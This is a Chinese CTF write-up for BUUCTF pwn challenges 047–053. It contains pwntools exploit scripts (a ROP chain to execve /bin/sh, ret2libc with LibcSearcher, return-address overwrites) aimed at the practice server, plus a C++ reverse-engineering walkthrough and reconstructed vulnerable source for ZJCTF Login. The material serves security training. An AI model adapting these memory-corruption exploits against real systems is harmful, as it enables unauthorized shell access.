# buu047-cmcc_simplerop
和上一道题的思路完全相同。
```python
from pwn import *
context.log_level='debug'
# io = process('./pwn')
io = remote('node4.buuoj.cn', 26121)
int80 = 0x80493E1
popeax_ret = 0x80BAE06
popedx_ret = 0x806e82a
popecx_ebx_ret = 0x806E851
addesp0x14_ret = 0x807b36c
bss = 0x80EB060
read = 0x806CD50
payload = cyclic(0x14 + 12)

payload += p32(read)			# call read()
payload += p32(addesp0x14_ret)	# return address, add esp to execute latter ROP
payload += p32(0)				# arg #1 of read(): stdin
payload += p32(bss)				# arg #2 of read(): a bss address
payload += p32(0x8)				# arg #3 of read(): read length
payload += p32(0) * 2

payload += p32(popeax_ret)		# eax = 0x11(SYS_EXECVE)
payload += p32(11)
payload += p32(popecx_ebx_ret)
payload += p32(0)				# ebx = '/bin/sh'
payload += p32(bss)				# edx = 0
payload += p32(popedx_ret)
payload += p32(0)				# ecx = 0
payload += p32(int80)			# int 80

io.sendline(payload)
io.sendline(b'/bin/sh' + b'\x00')
io.interactive()
```
# buu048-picoctf_2018_buffer overflow 2
```python
from pwn import *
context.log_level='debug'
# io = process('pwn')
io = remote('node4.buuoj.cn', 27446)
io.sendline(cyclic(0x6C+4) + p32(0x80485CB) + p32(0) + p32(0xdeadbeef) + p32(0xdeadc0de))
io.interactive()
```
# buu049-xdctf2015_pwn200
```python
from pwn import *
from LibcSearcher import *
context.log_level='debug'
# io = process('./pwn')
io = remote('node4.buuoj.cn', 25724)
elf = ELF('./pwn')
payload = cyclic(0x6C + 4)
payload += p32(elf.plt['write'])
payload += p32(elf.symbols['vuln'])
payload += p32(1)
payload += p32(elf.got['write'])
payload += p32(4)
io.sendlineafter(b'Welcome to XDCTF2015~!\n', payload)
write = u32(io.recv(4))
print(hex(write))
libc = LibcSearcher('write', write)
base = write - libc.dump('write')
sys = libc.dump('system') + base
binsh = libc.dump('str_bin_sh') + base
payload = cyclic(0x6C + 4)
payload += p32(sys)
payload += p32(0)
payload += p32(binsh)
io.sendline(payload)
io.interactive()
```
# buu050-bbys_tu_2016
```python
from pwn import *
context.log_level='debug'
# io = process('./pwn')
io = remote('node4.buuoj.cn', 27499)
io.sendline(cyclic(0xC + 12) + p32(0x804856D))
io.interactive()
```
# buu051-mrctf2020_easyoverflow
连上之后输48个无效字节+'n0t_r3@11y_f1@g'
# buu052-wustctf2020_getshell_2
这道题只能溢出到返回地址+4字节的地方，直接修改返回地址到system函数的话参数写不进去，所以利用shell函数返回到指令'call _system'的地方，在后面就可以写函数参数'sh'（截取/bbbbbbbbin\_what\_the\_f?ck\_\_--??/sh的最后两个字节）了。
```python
from pwn import *
context.log_level='debug'
# io = process('./pwn')
io = remote('node4.buuoj.cn', 29467)
elf = ELF('./pwn')
io.sendline(cyclic(24+4) + p32(0x8048529) + p32(0x8048670))
io.interactive()
```
# buu053-[ZJCTF 2019]Login
第一道C++ pwn题。这也是我第一次认真在做一道C++ pwn的题目。
当然首先，我们需要会逆向C++程序。C++是C的超集，有很多C中没有的东西。其中最为重要的就是类与对象的识别了。
在这一题中，程序的符号表貌似没有被删除，我们可以看到IDA为我们分析出来的各种函数名与类名称。
![](https://img-blog.csdnimg.cn/71aff38bece04a26a36e2d9a3e1ff1e3.png)
其中容易发现程序中定义了两个类：User和Admin，而且似乎有三个main中定义的lambda函数。

程序中无法查看User类的具体结构，因此我们需要手动创建User类结构体，在IDA的Structures窗口中定义：Ins快捷键创建结构体，Del删除结构体，D/A/*创建结构体成员（常用D），N修改成员名，U删除成员。如下图：（具体为什么要这样定义看下面的分析）
![](https://img-blog.csdnimg.cn/f746484ce3754ae7b30226894ed46457.png)


通过User类的构造函数发现，构造函数在User，User+8，User+0x58处进行了赋值操作，这里的后面两个均是使用strncpy函数赋值，因此判断是字符串。第一个声明赋值指向的是这样一个结构，有两个函数指针，判断是User类的虚函数表，因为C++类的虚函数表通常都是放在类的最开头位置。可以看到User类中定义了两个虚函数get_password和shell。使用快捷键Y可以修改参数的类型，修改为合适的类型之后，反汇编出来的代码中就不会有一大堆强制转型了，看上去舒服很多。
![](https://img-blog.csdnimg.cn/7cb4c23ae1e5418a82e63d8cc84d1b11.png)
又通过User类的get_password方法可以判断出后面两个大小为0x50的字符串中到底哪个是用户名哪个是密码。使用快捷键N可以修改参数或变量的名字，修改之后的User类构造函数如下图：
![](https://img-blog.csdnimg.cn/bf6791a8aeb14847909ccaef41b8f23e.png)
另外，在main函数中发现了login变量，其属于User类，且位于bss段中，判断是User类全局变量对象。我们将bss段中的这个对象修改类型发现大小正好符合，说明我们之前定义的User类结构是正确的。
![](https://img-blog.csdnimg.cn/bf45dcdd71764f459b5edd1810b1fd6f.png)
![](https://img-blog.csdnimg.cn/cd88c318d7ee4385a4e21b7ed411a321.png)
再看一下Admin类的构造函数，发现其调用了User类的构造函数，因此判断Admin类是User类的子类。
![](https://img-blog.csdnimg.cn/63e222cebc324b75a52166d4b5f3ac64.png)
从Admin类虚函数表中含有User类函数也可以说明Admin类是User的子类，且Admin类覆写了User类的shell方法，打开发现User类的shell没有任何作用，而Admin类的shell方法就是直接执行'/bin/sh'，是一个后门。而get_password类没有覆写，在User类中仅仅是用了virtual声明而已。
![](https://img-blog.csdnimg.cn/7ef08d5aec4f4fabac0726c69a330ec6.png)
现在，我们已经将程序中主要的类、对象分析完毕，main函数的前半部分我们可以读懂了。
![](https://img-blog.csdnimg.cn/da71226d729c4aaeb2e5419d62a3c347.png)
在main函数中，实例化了一个Admin对象，用户名为admin，密码为2jctf_pa5sw0rd。然后接受用户的输入设置全局User类对象的用户名和密码。

然后main函数用lambda函数做了一些什么事情，我们进入password_checker的某个函数看一下。
![](https://img-blog.csdnimg.cn/173d05bbcc0e4410b2b2d4e165316c8c.png)
这个函数进行密码输入的比较，如果输入密码正确就执行exec函数指针指向的函数。
根据这个函数的声明，推测password_checker应该是一个结构体，其中包含了后面的lambda函数（注意这个函数应该是一个定义于password_checker结构体中的lambda函数，注意password_checker与lambda函数之间是以::连接）
![](https://img-blog.csdnimg.cn/5f1b656e104a4a95be5983efb53a5508.png)
在password_checker函数中发现了checker结构体的赋值操作，password_checker中只有这一个函数指针存在。
![](https://img-blog.csdnimg.cn/c5e6c8ec278b4fec94deef62617b8ee4.png)
因此这一段代码原本的作用是：检查密码是否输入正确，如果正确则执行greeting_func函数：
![](https://img-blog.csdnimg.cn/efc3384eb0684838a1af617e3a303d17.png)
但是经过实地运行发现，在lambda函数中会发生段错误，错就错在exec函数指针上。原本指针的值应为0x400A90，但是执行到这里的时候发现已经被改成了0x400090。
![](https://img-blog.csdnimg.cn/af41c306274c4102920ff3da574a1184.jpeg)
进一步跟踪调试发现，是strip_newline函数自动识别换行符（ASCII码为0xA），然后给这个地址错误地修改了，变成了一个无效的值。

这给了我们提示：strip_newline是在lambda函数中调用的，但是却能够修改exec函数的地址，通过调试我们不难发现，exec是一个指针，通过main函数调用password_checker函数获取，但是这是password_checker的局部变量，其地址应该在main函数栈帧的低地址处（main函数实际上没有栈帧，这里类比其他函数的栈帧方便理解），也就是main函数执行时esp的低地址处，而调用其他函数时这里的地址自然就有可能会受到影响。由此可见，如果我们输入密码的时候修改这里的地址值到Admin类的shell函数地址，就能够拿到shell了。

因此，本题的漏洞点在于返回局部变量的值，属于逻辑错误。子函数返回到父函数的返回值不应该是子函数局部变量的值。漏洞本身不难，但是对于逆向C++而言还是一次很好的训练与学习。

exp：
```python
from pwn import *
context.log_level='debug'
# io = process('./pwn')
io = remote('node4.buuoj.cn', 26270)
io.sendline(b'admin')
io.sendline(b'2jctf_pa5sw0rd\x00\x00' + p64(0x400E88) * 8)
io.interactive()
```

尝试使用CLion还原出程序的源代码：（C++基础不扎实，尽量还原）
```cpp
#include <iostream>
#include <cstring>
using namespace std;

void strip_newline(char* buf, int64_t length){
    char* i;
    for(i = &buf[length]; i >= buf; i--){
        if ( *i == '\n' )
            *i = '\0';
    }
}

class User{
private:
    char username[0x50]{};
    char password[0x50]{};
public:
    User(){}
    User(const char* username, const char* password){
        strncpy(this->username, username, 0x50);
        strncpy(this->password, password, 0x50);
    }
    void read_name(){
        char name[80];
        fgets(name, 79, stdin);
        strip_newline(name, 80);
        strncpy(this->username, name, 0x50);
    }
    void read_password(){
        char pwd[80];
        fgets(pwd, 79, stdin);
        strip_newline(pwd, 80);
        strncpy(this->password, pwd, 0x50);
    }
public:
    virtual char* get_password(){
        return this->password;
    }
    virtual void shell(){
        puts("No shell for you!");
    }
};

class Admin : User{
public:
    Admin(const char* username, const char* password) : User(username, password){}
    void shell() override{
        puts("Congratulations!");
        system("/bin/sh");
    }
    char* get_password() override{
        return User::get_password();
    }
};

typedef struct checker{
    void (*check)();
    int64_t null[2];
}checker;

checker* password_checker(void (*check)()){
    checker checker;
    checker.check = check;
    return &checker;
}

User login;

int main() {
    char admin_password[88];
    cout << "Hello, World!" << endl;
    setbuf(stdout, 0);
    strcpy(admin_password, "2jctf_pa5sw0rd");
    memset(&admin_password[15], 0, 65);
    Admin admin((const char*)"admin", admin_password);
    puts(
            " _____   _  ____ _____ _____   _                _       \n"
            "|__  /  | |/ ___|_   _|  ___| | |    ___   __ _(_)_ __  \n"
            "  / /_  | | |     | | | |_    | |   / _ \\ / _` | | '_ \\ \n"
            " / /| |_| | |___  | | |  _|   | |__| (_) | (_| | | | | |\n"
            "/____\\___/ \\____| |_| |_|     |_____\\___/ \\__, |_|_| |_|\n"
            "                                          |___/         ");
    printf("Please enter username: ");
    login.read_name();
    printf("Please enter password: ");
    auto greeting_func = []()->void{
        puts("<===Welcome to ZJCTF!!!===>");
        return login.shell();
    };
    checker* exec = password_checker(greeting_func);
    login.read_password();
    char* admin_pwd = admin.get_password();
    char* user_pwd = login.get_password();
    [](checker* exec, char* admin_pwd, char* user_pwd)->void{
        char s[88];
        if(!strcmp(admin_pwd, user_pwd)){
            snprintf(s, 0x50uLL, "Password accepted: %s\n", s);
            puts(s);
            exec->check();
        }else{
            puts("Nope!");
        }
    }(exec, admin_pwd, user_pwd);
    return 0;
}

```
